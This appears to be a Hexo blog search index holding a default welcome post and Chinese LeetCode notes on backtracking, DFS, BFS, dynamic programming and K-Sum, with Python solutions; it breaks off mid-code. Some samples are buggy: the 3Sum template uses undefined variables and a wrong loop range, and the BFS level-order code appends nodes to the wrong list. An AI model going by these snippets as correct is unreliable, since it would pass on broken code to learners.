    <title>Hello World</title>
    <url>/2024/03/07/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode笔记3 - 回溯类问题（DFS）解题模板</title>
    <url>/2024/03/14/leetcode-backtrace/</url>
    <content><![CDATA[<h1 id="Leetcode笔记3-回溯类问题-DFS"><a href="#Leetcode笔记3-回溯类问题-DFS" class="headerlink" title="Leetcode笔记3 - 回溯类问题-DFS"></a>Leetcode笔记3 - 回溯类问题-DFS</h1><h2 id="1-回溯类问题"><a href="#1-回溯类问题" class="headerlink" title="1. 回溯类问题"></a>1. 回溯类问题</h2><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="49-子集"><a href="#49-子集" class="headerlink" title="49. 子集"></a><a href="https://leetcode.cn/problems/subsets/">49. 子集</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/description/">46. 全排列</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>此题同样可以通过动态规划求解，因为我们发现对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。详细解法见动态规划类解题模板。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        track = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">n, left, right, track</span>):</span><br><span class="line">            <span class="keyword">if</span> left &gt; n <span class="keyword">or</span> right &gt; left:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left == right == n:</span><br><span class="line">                res.append(track)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> choice <span class="keyword">in</span> [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]: <span class="comment">## 注意，我们的选择其实只有&#x27;(&#x27;和&#x27;)&#x27;两个，我们的base case取决于&#x27;(&#x27;和&#x27;)&#x27;的数量</span></span><br><span class="line">                <span class="keyword">if</span> choice == <span class="string">&#x27;(&#x27;</span>: left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right += <span class="number">1</span></span><br><span class="line">                track += choice</span><br><span class="line">                backtrace(n, left, right, track)</span><br><span class="line">                <span class="keyword">if</span> track[-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>: left -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right -= <span class="number">1</span></span><br><span class="line">                track = track[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        backtrace(n, <span class="number">0</span>, <span class="number">0</span>, track)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h2 id="2-DFS类问题"><a href="#2-DFS类问题" class="headerlink" title="2. DFS类问题"></a>2. DFS类问题</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记6 - 动态规划解题模板</title>
    <url>/2024/03/20/leetcode-dp/</url>
    <content><![CDATA[<h2 id="Leetcode笔记6-动态规划"><a href="#Leetcode笔记6-动态规划" class="headerlink" title="Leetcode笔记6 - 动态规划"></a>Leetcode笔记6 - 动态规划</h2><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h2><p>这题可以用dp解纯粹是因为发现了一个规律，即：对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。</p>
<p>同样的，又因为我们可以记录()的路径，我们同样可以用回溯法来解，见回溯解法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]: <span class="comment">## 注意，函数返回的是List</span></span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment">## dp[0] = 0 </span></span><br><span class="line">        <span class="comment">## dp[1] = 1  &quot;()&quot;</span></span><br><span class="line">        <span class="comment">## dp[2] = dp[1] + 2 - 1 = 2 &quot;(()), ()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[3] = dp[2] + 4 - 1 = 5   &quot;((()))  (()()) (())() &quot; + &quot;()(()) ()()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[n] = dp[n-1] + 2n - 1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> [<span class="string">&quot;()&quot;</span>]</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> pre_str <span class="keyword">in</span> self.generateParenthesis(n-<span class="number">1</span>): <span class="comment">## 要求dp(n)，就要用到dp(n-1)</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(pre_str) + <span class="number">1</span>):</span><br><span class="line">                res.add(pre_str[:j] + <span class="string">&quot;()&quot;</span> + pre_str[j:])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记5 - BFS解题模板</title>
    <url>/2024/03/20/leetcode-bfs/</url>
    <content><![CDATA[<h1 id="Leetcode笔记5-BFS"><a href="#Leetcode笔记5-BFS" class="headerlink" title="Leetcode笔记5 - BFS"></a>Leetcode笔记5 - BFS</h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记2 - K-Sum类问题解题模板</title>
    <url>/2024/03/13/leetcode-ksum/</url>
    <content><![CDATA[<h1 id="Leetcode笔记2-K-Sum"><a href="#Leetcode笔记2-K-Sum" class="headerlink" title="Leetcode笔记2 - K-Sum"></a>Leetcode笔记2 - K-Sum</h1><p>K-Sum类问题是指给你一个数组，让你从中挑选出K个数字满足和为N。</p>
<p>K-Sum类的核心思想是 2Sum，然后套娃就行了。因此此类问题的关键点在于<strong>2Sum</strong>的实现。</p>
<p><strong>核心思路</strong>：</p>
<p>​	1、<strong>数组排序</strong></p>
<p>​	2、<strong>双指针</strong>：头尾相向移动，遇到相同的数字跳过****</p>
<p>​	3、<strong>防止重复值</strong>：每个最外层的遍历都需要防止重复值，以及对于遍历数组的边界值的处理</p>
<p><strong>套路模板：</strong></p>
<p>实现(K-1)-Sum，以3Sum为例，首先要实现2Sum：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2-Sum可直接默写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, start, target</span>):</span><br><span class="line">    res = []</span><br><span class="line">    low, high = start, <span class="built_in">len</span>(nums)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        sum_ = nums[low] + nums[high]</span><br><span class="line">        <span class="keyword">if</span> sum_ &lt; target:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 指针一定要注意，因为前面已经low += 1了</span></span><br><span class="line">            <span class="comment"># 所以现在的nums[low]一定要和nums[low-1]去比较</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">elif</span> sum_ &gt; target:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="comment"># nums[high]同理</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append([nums[low], nums[high]])</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3-Sum 主要是要注意边界值的问题 和 要防止有重复值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums.sort()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums[i]-<span class="number">2</span>): <span class="comment">## 注意边界值为K-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span> <span class="comment">## 因为是升序排列，可提高效率</span></span><br><span class="line">        <span class="keyword">if</span> low &gt; <span class="number">0</span> <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: <span class="keyword">continue</span> <span class="comment">## 防止有重复值</span></span><br><span class="line">        <span class="comment">## 调用2Sum</span></span><br><span class="line">        target_ = target - nums[i]</span><br><span class="line">        tuples = twoSum(nums, i+<span class="number">1</span>, target_)</span><br><span class="line">        <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">            tup.append(nums[i])</span><br><span class="line">            res.append(tip)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, start, target</span>):</span><br><span class="line">        res = []</span><br><span class="line">        low = start</span><br><span class="line">        high = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            sum_ = nums[low] + nums[high]</span><br><span class="line">            <span class="keyword">if</span> sum_ &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high = high -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> sum_ &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append([nums[low], nums[high]])</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span 